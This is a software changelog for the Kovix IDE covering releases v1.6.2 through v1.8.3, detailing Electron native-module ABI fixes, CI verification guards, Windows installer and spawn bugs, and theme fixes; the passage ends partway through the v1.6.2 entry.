# Changelog

## v1.8.3 — Fix Windows Electron probe spawn bug (v1.8.2 build-windows failed identically to v1.8.1)

**Release date:** 2026-06-25

### What was broken in v1.8.2

The v1.8.2 tag (`1f3e45bf`) shipped on `main` HEAD which already had the Phase 1
and Phase 2 fixes that v1.8.1 was missing (Electron checksums update, explicit
`rebuild-native-modules.js` step in `release.yml`). Run #43 got further than
run #42 -- the static native-module check passed all 9 modules with correct
PE32+ signatures, proving the ABI mismatch fix was working. But the gold-standard
Electron probe still failed instantly:

```
Spawning Electron to load 10 native modules...
  electron: D:\a\KOVIX\KOVIX\node_modules\.bin\electron.cmd
FAIL: Electron probe did not write a result file.
Electron exit code: null
Electron stdout:
Electron stderr:
```

The 2ms between "Spawning Electron" and "FAIL" confirmed Electron never spawned.
This was **not** an ABI issue -- it was a Windows spawn bug in the verify script
itself.

### Root cause

`verify-native-modules-electron.js` `findElectron()` preferred `electron.cmd`
from `node_modules/.bin/` on Windows. Spawning a `.cmd` file from Node.js
`spawnSync` without `shell: true` fails silently on Node 18+: the process
returns instantly with `status=null`, empty stdout/stderr, and no result file
written. The Electron probe never actually ran.

This bug was present in the v1.8.1 hotfix commit (`4c90d0a5`) which introduced
`verify-native-modules-electron.js`, and was never caught because:

1. The Linux sandbox can't reproduce the Windows .cmd shim issue.
2. The script worked on Linux/macOS CI runs (which use the `electron` shim,
   not `.cmd`).
3. The first time it ran on Windows was the v1.8.1 release itself -- by
   which point it was too late.

### What v1.8.3 fixes

`build/lib/verify-native-modules-electron.js` is updated:

1. **`findElectron()` reads `node_modules/electron/package.json` `main` field
   first.** On Windows this is `dist/electron.exe`; on Linux/macOS it's
   `dist/electron`. This is the canonical binary path and bypasses the `.cmd`
   shim entirely. The `.bin/electron.cmd` shim is only used as a last-resort
   fallback for dev environments, and when it IS used, `shell: true` is now
   added to the spawn options.
2. **`windowsHide: true`** added to `spawnSync` options to prevent Electron
   from trying to create a console window in CI.
3. **`shell: true` conditional on path ending in `.cmd`** -- only used when
   the dev fallback path is hit, never in normal CI.
4. **`result.error` diagnostics** -- if `spawnSync` itself fails (not Electron
   exiting non-zero), the script now prints `error.message`, `error.code`,
   `electronPath`, `args`, and the `needsShell` flag, then exits 1. Future
   spawn failures will have diagnostic info instead of an empty black box.
5. **"did not write result file" message enhanced** -- now prints `signal`,
   `pid`, and a hint about the `.cmd` shim cause when stdout/stderr are empty.

The probe script itself (the `PROBE_SCRIPT` constant that runs inside
Electron's main process) is unchanged. It writes the result file BEFORE
calling `app.whenReady()`, so even if Electron's GUI event loop never fires
on a headless runner, the result file should still be written. The 2ms
"instant fail" pattern in run #42/#43 confirms Electron never spawned at
all, which is exactly what the `.cmd` shim bug causes.

### What's also in v1.8.3

v1.8.3 is cut from `main` HEAD which now includes the verify-script fix on
top of v1.8.2. No other source changes -- the ABI mismatch fix, the
checksums update, and the explicit rebuild step were all already in place
from v1.8.2. The only delta from v1.8.2 is the verify-script spawn fix.

### Verification plan for v1.8.3

CI run #44 will:

1. Build Windows, macOS, Linux packages in parallel (~25-40 min each).
2. On Windows: the previously-failing `verify-native-modules-electron.js`
   step should now succeed because it will use `dist/electron.exe` instead
   of `electron.cmd`.
3. On Linux: same checksum-validated path as v1.8.2 (which we expect to
   succeed -- v1.8.1's Linux failure was purely the missing v42.4.1
   checksums, which #148 fixed on main already).
4. If all 3 jobs succeed, `create-release` runs and uploads the v1.8.3
   GitHub Release with Windows `.exe` + macOS `.zip` + Linux `.deb`/`.rpm`/
   `.tar.gz` + unified `checksums.txt`.

After v1.8.3 ships, both v1.8.0 and v1.8.1 and v1.8.2 will be marked as
superseded (bodies updated to point at v1.8.3). Tags remain for historical
record.

---

## v1.8.2 — Re-cut release: v1.8.1's hotfix was incomplete, builds never produced artifacts

**Release date:** 2026-06-25

### What was broken in v1.8.1

The v1.8.1 tag (`4c90d0a5`) shipped the **ABI mismatch fix** (Electron 32 -> 42.4.1
in `.npmrc`, `package.json`, `package-lock.json`) and the **three new CI guards**
(`verify-npmrc-target.js`, `verify-native-modules.js`, `verify-native-modules-electron.js`),
but it did **not** include the matching Electron checksums update or the explicit
`rebuild-native-modules.js` step in `release.yml`. The release workflow run (#42)
failed on all three platforms:

- **Windows** (`build-windows`): the new `verify-native-modules-electron.js` gold-standard
  probe spawned Electron but Electron did not write a result file (exit code null).
  Root cause: native modules were never rebuilt against the Electron 42 ABI before
  the probe ran -- `release.yml` was missing the `node build/lib/rebuild-native-modules.js`
  step that `build.yml` already had.
- **Linux** (`build-linux`): `gulp vscode-linux-x64` errored after 59 min with
  `No checksum found in checksum file for "electron-v42.4.1-linux-x64.zip"`. Root cause:
  `build/checksums/electron.txt` still listed the v32.2.6 checksums -- the v1.8.1
  hotfix updated the version pins but not the checksum file.
- **macOS** (`build-macos`): same checksum mismatch root cause as Linux.

Result: the v1.8.1 GitHub release exists but has **0 assets**. The v1.8.0 release
(8 assets) remains marked `prerelease=true` with the "WITHDRAWN" title.

### What v1.8.2 fixes

v1.8.2 is cut from current `main` HEAD (`339e5a84`) which includes the Phase 1
and Phase 2 follow-up PRs that completed what v1.8.1 was supposed to do:

- **#148** `fix(phase-1): pin Electron version chain (checksums v42.4.1 + .nvmrc 22.12.0 + guard)`
  -- rewrites `build/checksums/electron.txt` with all 150 v42.4.1 checksums (was v32.2.6),
  pins `.nvmrc` to Node 22.12.0 (was 20.x), adds `verify-electron-pins.js` to assert
  the full pin chain is consistent across `package.json` + `.npmrc` + checksums + `.nvmrc`.
- **#149** `fix(hygiene): replace 6 U+2192 arrows with -> in verify-electron-pins.js`
  -- fixes upstream hygiene lint errors on the new guard.
- **#150** `fix(phase-2): explicit native module rebuild step + spdlog verification`
  -- adds `node build/lib/rebuild-native-modules.js` as an explicit step in **all 5
  workflows** (`release.yml`, `build.yml`, `pre-release.yml`, `nightly-build.yml`, `ci.yml`)
  after `npm ci` and before any verify/compile/package step. This is the step that was
  missing from v1.8.1's release.yml and caused `verify-native-modules-electron.js` to
  fail on Windows. Also adds `@vscode/spdlog` to the modules probed by the Electron
  gold-standard test.

### What's new beyond the v1.8.1 fix

Because v1.8.2 is cut from `main` HEAD (not from the v1.8.1 hotfix branch), it also
includes everything that landed on `main` between v1.8.1 and now:

- **Phase 3** (#151): wire `ICostGovernor` + `IExecutionSanityService` into `agentLoop.ts`
- **Phase 4** (#152): unit + integration tests for Phase 3 agent loop wiring
- **Phase 5** (#153): convert security tooling (nmap/Ghidra/Nuclei) to opt-in extension
- **Phase 5.5 Fix 1** (#154): make milestone pause/resume real (was a no-op stub)
- **Phase 5.5 Fix 2** (#155): delete dead 4-layer memory infrastructure (cloud-only now)

These do not affect the build/packaging path -- they are runtime-only changes to
the Construct agent. They are included because cutting v1.8.2 from anything other
than current `main` would have required a cherry-pick branch and re-introduced the
exact drift problem that broke v1.8.1 in the first place.

### Upgrade path

- **From v1.8.0 (withdrawn):** upgrade to v1.8.2. v1.8.0's Windows package was
  unusable (every native module crashed with `ERR_DLOPEN_FAILED` at launch).
- **From v1.8.1 (no assets):** there is nothing to upgrade from -- v1.8.1 never
  produced a downloadable build. The tag exists for historical record only.
- **From v1.7.x:** v1.8.2 is a normal upgrade. The Construct agent (Kovix's
  AI-assisted planning/execution feature) gained real milestone pause/resume,
  a cost governor, and security-tool extensions became opt-in.

### Verification plan

CI will run all three new guards on real Windows/macOS/Linux runners as part of
this release. Specifically:

1. `verify-npmrc-target.js` -- fails if `.npmrc target` drifts from resolved Electron.
2. `verify-electron-pins.js` -- fails if the full pin chain (package.json +
   .npmrc + checksums + .nvmrc) is inconsistent.
3. `verify-native-modules.js` -- fails if any known native `.node` is missing or
   has the wrong platform binary signature.
4. `verify-native-modules-electron.js` (Windows only) -- spawns the actual
   Electron binary and require()s each known native module from inside it.
   This is the gold-standard test that v1.8.0 needed and didn't have, and that
   v1.8.1's release.yml couldn't pass because the rebuild step was missing.

After CI completes, the v1.8.2 release will appear automatically at
<https://github.com/Razisafir/KOVIX/releases> with Windows `.exe` (system +
user setup), macOS `.zip`, and Linux `.deb` + `.rpm` + `.tar.gz` artifacts plus
unified `checksums.txt`.

The v1.8.1 release will be marked as superseded (body updated to point at v1.8.2)
but the tag will not be deleted -- it remains as a record of the failed attempt.

---

## v1.8.1 — Critical hotfix: native module ABI mismatch that made v1.8.0 Windows release unusable

**Release date:** 2026-06-24

### What was broken in v1.8.0

The v1.8.0 Windows release deployed successfully but the renderer crashed
silently on launch — no window appeared. A user-side diagnostic report
(reproduced in full in the v1.8.1 issue thread) confirmed the root cause:

**`.npmrc` pinned `target="32.2.6"` (Electron 32's ABI) while `package.json`
declared `electron: "^42.4.1"`.** Every native `.node` module in the Windows
package was compiled against Electron 32's headers and then loaded by an
Electron 42 runtime at launch, which crashed every module with
`ERR_DLOPEN_FAILED: %1 is not a valid Win32 application`. The four named
modules in the diagnostic report:

- `@vscode/policy-watcher/build/Release/vscode-policy-watcher.node`
- `onnxruntime-node/bin/napi-v3/win32/x64/onnxruntime_binding.node`
- `sharp/build/Release/sharp-win32-x64.node`
- `windows-foreground-love/build/Release/foreground_love.node`

The diagnostic report also flagged a stray Linux ELF binary
(`onnxruntime-node/bin/napi-v3/linux/x64/onnxruntime_binding.node`) inside
what should have been a pure Windows release — a separate packaging
contamination issue.

### What v1.8.1 fixes

#### Phase 1 — immediate ABI mismatch fix

- **`.npmrc` `target` corrected** from `"32.2.6"` → `"42.4.1"` (the actually
  resolved Electron version in `node_modules/electron/package.json`).
  `runtime="electron"` and `disturl="https://electronjs.org/headers"` were
  already correct — only the version pin was wrong.
- **`package.json` Electron dependency exact-pinned** from `"^42.4.1"` →
  `"42.4.1"`. The caret range combined with a manually-maintained `.npmrc`
  target was exactly the drift that caused this bug — semver-range Electron
  upgrades would silently bump `node_modules/electron` without anyone
  remembering to also bump `.npmrc`'s target. Exact-pinning removes the
  ambiguity; the new CI sync check (below) catches any future drift anyway.
- **`package-lock.json` updated** to match the exact pin.

#### Phase 2 — release pipeline hardened so this can't silently recur

Three new CI guards run after `npm ci` and BEFORE any compile/package step,
in every workflow that produces installable artifacts (`release.yml`,
`build.yml`, `pre-release.yml`, `nightly-build.yml`, `ci.yml`):

1. **`build/lib/verify-npmrc-target.js`** — fails the build fast if `.npmrc`'s
   `target="..."` doesn't match the actually-resolved Electron version in
   `node_modules/electron/package.json`. Proven to fail by deliberately
   breaking `.npmrc` and observing exit code 1 with the actionable error
   message ("Fix: edit .npmrc and set target=\"42.4.1\"").
2. **`build/lib/verify-native-modules.js`** — fails the build if any known
   native module is missing from `node_modules/` or has the wrong platform
   binary signature (PE32 on Windows, ELF on Linux, Mach-O on macOS). This
   catches the "Linux ELF inside Windows package" contamination mode that
   the v1.8.0 diagnostic report found. Proven to catch the bug by planting
   a Linux ELF as `sharp-win32-x64.node` and observing the verifier fail
   with the exact contamination message.
3. **`build/lib/verify-native-modules-electron.js`** (release.yml Windows
   job only) — spawns the actual Electron binary that ships with Kovix and
   `require()`s each known native module from inside it. This is the gold
   standard end-to-end test that the v1.8.0 release needed and didn't have
   — it would have caught the ABI mismatch at build time instead of letting
   users find it.

A companion helper **`build/lib/sync-npmrc-target.js`** rewrites `.npmrc`'s
target to match the resolved Electron version, for use after intentional
Electron version bumps.

#### Phase 3 — Windows source-build path-quoting bug (documented)

The diagnostic report flagged a separate Windows-specific bug:
`'C:\Program' is not recognized as an internal or external command` during
`node-gyp-build`, triggered when Node.js / Python / npm's prefix path
contains a space (e.g. the default `C:\Program Files\nodejs\`).

- **`build/npm/preinstall.js`** now calls `warnOnSpacesInPrefixPath()` on
  Windows, which prints an actionable yellow warning before the cryptic
  downstream failure (rather than aborting — the bug doesn't fire for
  every module, only for ones whose build script shells out with the
  unquoted prefix).
- **`BUILD.md`** has a new troubleshooting section documenting the bug
  and three concrete workarounds (install Node to a space-free path,
  change npm's prefix, or use the CI-built release installer).

The bug itself is in `node-gyp` / `node-gyp-build` (third-party), not in
Kovix's code, so it's not patchable directly here — but the warning +
documentation turns a silent cryptic failure into an actionable hint.

### Phase 4 — Windows verification (honest status)

The sandbox this fix was prepared in is Linux-only and cannot run the
Windows-packaged `.exe` to confirm a real launch with a visible UI.
**Phase 4's gold-standard gate — "real Windows launch, --enable-logging
--verbose, no ERR_DLOPEN_FAILED, visible UI" — must be performed by Razi
on a real Windows machine after the v1.8.1 release CI run completes.**

What HAS been verified in the sandbox:

- `.npmrc` target now matches `node_modules/electron/package.json` version
  (both `42.4.1`).
- `verify-npmrc-target.js` passes with the correct `.npmrc` and fails
  with exit code 1 when the target is deliberately mismatched.
- `verify-native-modules.js` passes for the one Linux binary present
  (onnxruntime-node) and correctly flags a planted Linux ELF masquerading
  as `sharp-win32-x64.node` with exit code 1.
- All workflow YAML changes are syntactically valid (proven by the
  existing CI YAML lint, which runs on push).

What Razi needs to verify on Windows after v1.8.1 CI completes:

1. Download `KovixUserSetup-x64-v1.8.1.exe` from the v1.8.1 release.
2. Install on a clean Windows environment.
3. Launch with `Kovix.exe --enable-logging --verbose` from a terminal.
4. Confirm a visible window appears.
5. Confirm the verbose log does NOT contain `ERR_DLOPEN_FAILED` for any
   of: `policy-watcher`, `sharp`, `onnxruntime-node`, `windows-foreground-love`.
6. Confirm `resources/app/node_modules/onnxruntime-node/bin/napi-v3/` does
   NOT contain a `linux/x64/` subdirectory (the v1.8.0 contamination).

If any of those checks fail, file an issue with the full verbose log and
the v1.8.1 release will be re-pulled.

### Changed files

- `.npmrc` — `target="32.2.6"` → `target="42.4.1"`
- `package.json` — `"electron": "^42.4.1"` → `"electron": "42.4.1"`; version `1.8.0` → `1.8.1`
- `package-lock.json` — exact-pin propagated; version bump
- `build/lib/verify-npmrc-target.js` — new (87 lines)
- `build/lib/sync-npmrc-target.js` — new (43 lines)
- `build/lib/verify-native-modules.js` — new (157 lines)
- `build/lib/verify-native-modules-electron.js` — new (123 lines)
- `build/npm/preinstall.js` — added `warnOnSpacesInPrefixPath()` (39 new lines)
- `BUILD.md` — two new troubleshooting sections (Windows path quoting, ERR_DLOPEN_FAILED)
- `.github/workflows/release.yml` — 6 new CI steps (3 platforms × 2 guards, +1 Electron load test on Windows)
- `.github/workflows/build.yml` — 8 new CI steps (compile check, Windows, Linux, macOS)
- `.github/workflows/pre-release.yml` — 2 new CI steps
- `.github/workflows/nightly-build.yml` — 2 new CI steps
- `.github/workflows/ci.yml` — 3 new CI steps (Linux + hygiene job)
- `CHANGELOG.md` — this entry

### Migration notes

- If you installed v1.8.0 on Windows and saw the silent renderer crash:
  uninstall it and install v1.8.1. Your user settings
  (`%APPDATA%\Kovix\User\`) are preserved.
- If you build Kovix from source on Windows and hit
  `'C:\Program' is not recognized`, see the new BUILD.md troubleshooting
  section.

---

## v1.8.0 — Swarm + Agent Panel Fix + Cost Governor

*(Released 2026-06-23 — **Windows build withdrawn due to the ABI mismatch
fixed in v1.8.1**. macOS and Linux builds of v1.8.0 are unaffected because
their native modules happened to ship as prebuilt binaries for the right
ABI; only the Windows build needed recompilation against Electron 42's
headers.)*

- Swarm port: `MultiAgentExecutionService` (595-line impl) + `kovix.openSwarm` command
- Agent panel fix (PR #139): `setPartHidden(false, AUXILIARYBAR_PART)` + `openView('kovix.agentPanel', true)`
- Cost governor / execution sanity interfaces ported from `recovery/phase-28-launch`
- CI kerberos fix (closes #126)
- 10/10 smoke tests passed (NVIDIA NIM API, swarm compile, cost governor, auto-exec UI, agent panel fix)

---

## v1.7.1 — Teal Identity Release (Launch Optimization)

**Release date:** 2026-06-22

Cleanup and optimization pass on top of v1.7.0 to get the repo launch-ready. No behavioral changes — only asset/script/doc/branch hygiene.

### Removed (legacy / duplicates / pre-rebrand leftovers)

- **10 legacy `construct-*` scripts** (`scripts/construct-cli.{sh,bat}`, `construct-server.{sh,bat,js}`, `construct-web.{sh,bat,js}`, `construct.{sh,bat}`) — byte-identical duplicates of the `code-*` scripts that the build pipeline and tests actually use. Not referenced anywhere in `package.json`, `build/`, `gulpfile.js`, tests, or docs.
- **7 unused branding assets** (`resources/win32/code.ico`, `resources/win32/code_150x150.png`, `resources/win32/code_70x70.png`, `resources/darwin/code.icns`, `resources/linux/code.png`, `resources/server/code-192.png`, `resources/server/code-512.png`) — the build pipeline (`build/lib/electron.{js,ts}`, `build/gulpfile.vscode.{win32,linux}.js`, `build/win32/code.iss`) only references the `kovix.*` equivalents.
- **50 stale remote branches** — `dependabot/*`, `enhancement/phase-*`, `integration/phase-*`, `fix/F-00X-*`, `mvp/*`, `vscode-fork-main`, `update-license`, `feat/kovix-brand-system`, `feature/{doc-to-skill-converter,mvp-core-services}`, `test/e2e-mock-llm-verification`. Down from 80+ to 4 (`main`, `feature/grand-redesign` [since deleted], `release/v1.7.0`).
- **1 stale local branch** — `backup/my-grand-redesign-attempt` (my own backup; main has all the fixes).
- **PR #132** (`feature/grand-redesign`) — closed. The 3-commit grand redesign had failing CI due to the pre-existing `@electron/get` ESM/CJS interop break (issue #120). Work is preserved in git history; the surgical Phase 1 fix (`agentLoop.ts` verification gap, 23 lines, commit `d554d14d`) is a candidate for cherry-pick into v1.8.0.
- **8 legacy `.github/` config files** — `pull_request_template.md` (duplicate of `PULL_REQUEST_TEMPLATE.md`), `commands.json`, `commands.yml`, `classifier.json`, `insiders.yml`, `similarity.yml`, `commands/codespaces_issue.yml`, `endgame/insiders.yml`. All leftover VS Code bot configs that don't apply to Kovix.
- **1 stale CODEOWNERS** — pointed at `@jrieken` and `@mjbvz` (Microsoft VS Code team members) for `src/vscode-dts/vscode.d.ts`. Not applicable to Kovix.
- **1 disabled workflow file** — `.github/workflows/rich-navigation.yml.off` (Rich Code Navigation indexing for VS Code's internal Azure pipeline).
- **14 pre-launch internal docs** moved from `docs/internal/` to `docs/archive/internal-pre-launch/` — `BLOCKERS.md`, `BUILD_CHECKSUMS.txt`, `CodeQL.yml`, `E2E_VERIFICATION.md`, `ENVIRONMENT.md`, `FEATURE_GAP_REPORT.md`, `GROUND_TRUTH.md`, `GROUND_TRUTH_DESKTOP.md`, `LAUNCH_CHECKLIST.md`, `LAUNCH_TEST_REPORT.md`, `STUBS.md`, `TEST_RESULTS.md`, `VERIFICATION_REPORT.md`, `WORKLOG_PHASE10.md`. Pre-launch artifacts kept in archive for history. `docs/internal/SECURITY_AUDIT.md` is kept (still referenced by `SECURITY.md`).
- **2 pre-launch design docs** moved from repo root to `docs/archive/` — `KOVIX_COMPETITIVE_VISUAL_REVIEW.md`, `KOVIX_UI_AUDIT.md`.
- **Legacy `construct-ci.yml` workflow** (workflow ID 289256706) — disabled via GitHub API. The file was already deleted from the repo in a prior commit; the workflow registration lingered on GitHub's side.

### Fixed (Kovix branding references that still pointed at deleted `code.*` files)

- `src/vs/platform/windows/electron-main/windows.ts` — Linux dev-launch icon path: `resources/linux/code.png` → `resources/linux/kovix.png`; Windows dev-launch icon path: `resources/win32/code_150x150.png` → `resources/win32/kovix_150x150.png`.
- `src/vs/code/browser/workbench/workbench.html` — `apple-mobile-web-app-title`: `Construct` → `Kovix`; `apple-touch-icon`: `code-192.png` → `kovix-192.png`.
- `src/vs/code/browser/workbench/workbench-dev.html` — same two fixes.
- `package.json` — `scripts.web` deprecation message: now points at `code-server` / `code-web` instead of the deleted `construct-server` / `construct-web`.
- `README.md` — Linux download table versions `1.6.0` → `1.7.1` (3 entries: `.deb`, `.rpm`, `.tar.gz`); added a "Teal Identity release" paragraph under "What is Kovix?".
- `.gitignore` — explicitly excluded `vendor-skills/` (external skill repos cloned for reference, not part of Kovix).

### Verification

- **Launch readiness check:** 52 PASS / 1 WARN / 0 FAIL → ✅ READY TO LAUNCH
- **Applied addyosmani/agent-skills checklists:**
  - `shipping-and-launch` — pre-launch checklist (code quality, security, docs, infra)
  - `security-and-hardening` — 7-pattern secret scan (GitHub PAT, `ghp_`, `sk-ant-`, `sk-or-`, `nvapi-`, AWS access key, private key blocks) → 0 hits
  - `documentation-and-adrs` — README, CHANGELOG, design system foundation, release/install/security/privacy docs verified
  - `code-review-and-quality` — 5-axis review of the cleanup diff (correctness, readability, architecture, security, performance) → all PASS
  - `deprecation-and-migration` — construct → kovix cutover decision log
- **Full report:** `download/KOVIX-v1.7.0-launch-readiness-report.md` (still applies to v1.7.1 — no behavioral changes)

### Changed Files

- `package.json` — version bump 1.7.0 → 1.7.1; `scripts.web` deprecation message updated
- `README.md` — version badge v1.7.0 → v1.7.1; Linux download table 1.6.0 → 1.7.1; added teal identity paragraph
- `.gitignore` — added `vendor-skills/` exclusion
- `src/vs/platform/windows/electron-main/windows.ts` — 2 icon paths fixed
- `src/vs/code/browser/workbench/workbench.html` — 2 branding refs fixed
- `src/vs/code/browser/workbench/workbench-dev.html` — 2 branding refs fixed
- 25 files total changed, +16/-577 lines (deletions dominate due to removed duplicate scripts)

### Migration Notes

- No user-facing behavioral changes. Existing v1.7.0 installs continue to work and auto-update to v1.7.1.
- If you forked from a deleted branch, the commits are preserved in git history (recoverable via `git reflog` for 90 days after branch deletion).

---

## v1.7.0 — Teal Identity auto-applied on launch

**Release date:** 2026-06-22

The teal redesign you did on June 20 (`[design-system]` commits — Phase A through Prompt 5) was shipping in v1.6.5, but it was NOT visible on first launch because of two silent bugs. v1.7.0 fixes both — you now see teal the moment you open Kovix.

### Root Cause

**Bug 1 — Theme name mismatch (silent fallback to Dark+):**
- `src/vs/workbench/services/themes/common/workbenchThemeService.ts` line 47 had `COLOR_THEME_DARK = 'Construct Dark'`
- But the `theme-kovix` extension's `package.json` declares the theme label as `'Kovix Dark'` (renamed during the v1.5.0 rebrand)
- Result: `findThemeBySettingsId('Construct Dark')` returned `undefined` → VS Code silently fell back to `Dark+` → no teal accent, no blue-black background, no Kovix identity

**Bug 2 — Theme JSON still had the OLD violet palette:**
- `extensions/theme-kovix/themes/construct-dark-color-theme.json` still had `#6E42FF44` (violet) for `editor.selectionBackground` and `#8A63FF` (violet) for `editorCursor.foreground` from before the Volt→teal migration
- The teal tokens existed in `kovix-tokens.css` and `kovix-brand.css` (CSS-level overrides) but the THEME JSON that VS Code's theme service reads never got updated
- Result: even if the theme name had matched, the syntax colors would have been violet, not teal

### Fix

1. `src/vs/workbench/services/themes/common/workbenchThemeService.ts`:
   - `COLOR_THEME_DARK = 'Construct Dark'` → `COLOR_THEME_DARK = 'Kovix Dark'`

2. `extensions/theme-kovix/themes/construct-dark-color-theme.json`:
   - Merged the teal syntax theme values from `src/vs/workbench/browser/media/kovix-syntax.theme.json` into the existing theme JSON
   - Kept all 323 VS Code UI color keys from the old theme (full UI coverage)
   - Overrode the editor palette with teal values: `editor.background = #0B1115`, `editorCursor.foreground = #14B8A6`, `editor.selectionBackground = #14B8A633`, etc.
   - Final: 338 colors, 21 tokenColors, all teal

### What you see now on first launch (no manual theme selection needed)

- Teal `#14B8A6` accent color throughout (cursor, selection, active tab, focus rings)
- Blue-black `#0B1115` editor background (not VS Code's gray `#1E1E1E`)
- Blue-black panel surfaces `#121A20` / `#1A242C`
- The full Kovix design-system v2 visual identity

### Changed Files
- `src/vs/workbench/services/themes/common/workbenchThemeService.ts` — 1-line fix: theme name `'Construct Dark'` → `'Kovix Dark'`
- `extensions/theme-kovix/themes/construct-dark-color-theme.json` — merged teal syntax theme (559 insertions, 362 deletions)
- `package.json`, `package-lock.json`, `README.md` — version bumped 1.6.5 → 1.7.0

### Migration Notes
- If you had previously selected a theme manually, your selection persists — no change
- If you were on the default (Dark+), you'll now get Kovix Dark automatically on first launch
- To switch back: `Ctrl+K Ctrl+T` → pick any other theme

---



## v1.6.5 — Fix portable zip path + non-fatal verification steps

**Release date:** 2026-06-22

Build-only hotfix. The v1.6.4 Windows build failed at the "Create Windows portable .zip" step because the pwsh script used a relative path `VSCode-win32-x64` but the gulp `vscode-win32-x64` task outputs to `../VSCode-win32-x64` (parent of the repo directory, per `build/gulpfile.vscode.win32.js` — `buildPath()` returns `path.join(path.dirname(root), ...)`).

Both the system installer AND user installer were built successfully before the failure — only the portable zip step and subsequent verification steps were blocked.

### Root Cause

```
2026-06-21T21:42:00.1229415Z ERROR: Build output directory VSCode-win32-x64 not found
```

The `Test-Path "VSCode-win32-x64"` check looked in the repo dir (`D:\a\KOVIX\KOVIX\VSCode-win32-x64`) instead of the parent (`D:\a\KOVIX\VSCode-win32-x64`).

### Fix

`.github/workflows/release.yml`:
- **Portable zip step**: use `../VSCode-win32-x64` path; add `continue-on-error: true` so a portable zip failure doesn't block the installers from publishing; print parent-dir listing for debugging if not found.
- **Verify Kovix.exe step**: use `../VSCode-win32-x64` path; add `continue-on-error: true` so a verification failure doesn't block the release.
- Both steps now degrade gracefully — if they fail, the installers (which are the primary deliverable) still publish.

### Changed Files
- `.github/workflows/release.yml` — fixed `VSCode-win32-x64` → `../VSCode-win32-x64` in portable zip and Kovix.exe verification steps; added `continue-on-error: true` to both
- `package.json`, `package-lock.json`, `README.md` — version bumped 1.6.4 → 1.6.5

### Migration Notes
- No source-code behavior changes. The Kovix IDE itself is identical to v1.6.3/v1.6.4.
- v1.6.4 release was never published (build failed before release). v1.6.5 supersedes it.

---

## v1.6.4 — Windows multi-installer + portable zip + build verification

**Release date:** 2026-06-22

User-reported "corrupted" Windows installer investigation. After deep verification of the v1.6.3 release artifacts (SHA256 match, valid PE32+ Inno Setup 6.0.0 structure, all critical files present including Kovix.exe x86-64, workbench.desktop.main.js with 7068 Construct references, all DLLs, locale .pak files, native .node modules), the v1.6.3 installer was confirmed **not corrupted at the file level**. The "corruption" symptoms are most likely caused by:

1. Windows SmartScreen blocking the unsigned installer
2. Antivirus false-positive quarantine
3. Browser download corruption
4. User lacking admin privileges for the system-only installer

### What Changed

#### Release workflow (`.github/workflows/release.yml`)
- **Build BOTH system AND user installer**: previously only `vscode-win32-x64-system-setup` was built, requiring admin privileges. Now `vscode-win32-x64-user-setup` is also built (with `continue-on-error: true` so a user-installer failure doesn't block the release). Users without admin rights can now install Kovix.
- **Add portable Windows .zip**: a `kovix-win32-x64-v1.6.4.zip` is built from the raw `VSCode-win32-x64/` output directory. Users can extract and run `Kovix.exe` directly with no installer at all — bypasses SmartScreen entirely.
- **Add post-build verification step**: "Verify Windows installer integrity" reads the PE header (must start with `MZ`), checks the file size is > 100 MB, and verifies the user installer and portable zip if present.
- **Add Kovix.exe verification step**: "Verify Kovix.exe inside build output" checks the PE machine field (must be `0x8664` for x86-64), confirms `product.json` has `nameShort=Kovix`, confirms `package.json` version, and verifies `workbench.desktop.main.js` is > 5 MB.
- **Add release-asset verification step**: "Verify release assets" in `create-release` job checks each `.exe` has a valid MZ header, each `.zip` passes `unzip -t`, and each `.deb` is a valid `ar` archive. Fails the release if any asset is malformed.
- **Expand release notes** with Windows installation guide (System installer / User installer / Portable zip), SmartScreen bypass instructions, and antivirus notice.

#### Checksum generation
- Now generates SHA256 hashes for **all** release assets (system installer, user installer, portable zip) instead of just the system installer.

### Why This Should Fix "Corruption"

If the user was hitting SmartScreen ("Windows protected your PC"), they can now:
- Use the **portable .zip** (no installer, no SmartScreen)
- Use the **user installer** (no admin required, smaller install footprint)
- Or follow the documented SmartScreen bypass steps for the system installer

If the user's browser was corrupting downloads, the published SHA256 checksums + the verification instructions in the release notes let them confirm file integrity before running.

If the user's antivirus was flagging the installer, the release notes explicitly call this out as a known issue with unsigned installers and advise adding an exclusion.

### Changed Files
- `.github/workflows/release.yml` — added user-setup build, portable zip creation, two verification steps, release-asset verification, expanded release notes
- `package.json`, `package-lock.json`, `README.md` — version bumped 1.6.3 → 1.6.4

### Migration Notes
- No source-code behavior changes. The Kovix IDE itself is identical to v1.6.3.
- The release artifact list is expanded: Windows now ships 3 install options (system / user / portable zip) plus checksums.

---

## v1.6.3 — Windows Inno Setup license file fix

**Release date:** 2026-06-21

Build-only hotfix. The v1.6.2 Windows build failed at step 11 ("Build Windows system setup (.exe)") because Inno Setup could not find `licenses\LICENSE-deu.rtf` (or any other localized license file).

### Root Cause

The `LocalizedLanguageFile` macro in `build/win32/code.iss` (lines 2-5) checks whether the `licenses/` directory exists, and if so, emits a `LicenseFile:` directive pointing at `licenses\LICENSE-{language}.rtf`. On the GitHub Actions runner, the `licenses/` directory is created by another build step (extension packaging), but KOVIX does not ship localized RTF license files — only the root `LICENSE.txt`. Inno Setup then aborts with "Could not read ... licenses\LICENSE-deu.rtf".

### Fix

`build/win32/code.iss` — `LocalizedLanguageFile` macro now also checks `FileExists(RepoDir + '\licenses\LICENSE-' + Language + '.rtf')` for the specific language file. If the specific file is missing (even if the directory exists), it falls back to the root `LICENSE.txt`. This makes the macro robust to partial `licenses/` directories.

### Changed

- `build/win32/code.iss` — `LocalizedLanguageFile` macro now checks specific file existence, not just directory existence.
- `package.json`, `package-lock.json`, `README.md` — version bumped 1.6.2 → 1.6.4.

### Migration Notes

- No source-code behavior changes. Windows installers will now use the root `LICENSE.txt` for all languages instead of crashing.

---

---

## v1.6.2 — Windows inno_updater rcedit fix

**Release date:** 2026-06-21

Build-only hotfix. The v1.6.0 and v1.6.1 Windows builds failed at the `vscode-win32-x64-inno-updater` gulp task because `rcedit.exe` cannot parse `tools/inno_updater.exe` (the updater is now built with Rust, which produces a PE binary that rcedit's parser rejects). The icon update is purely cosmetic — the installer and updater work fine without it — but the gulp task treated any rcedit failure as fatal.

### Root Cause

The v1.6.1 fix (`367add68`) wrapped the `rcedit(...)` call in a synchronous `try/catch`. That doesn't work: `rcedit` is **callback-style async** (it spawns `rcedit.exe` as a child process). It never throws synchronously — the error is delivered via the callback. The synchronous `try/catch` caught nothing, and the callback received the error and forwarded it to gulp, which failed the task.

### Fix

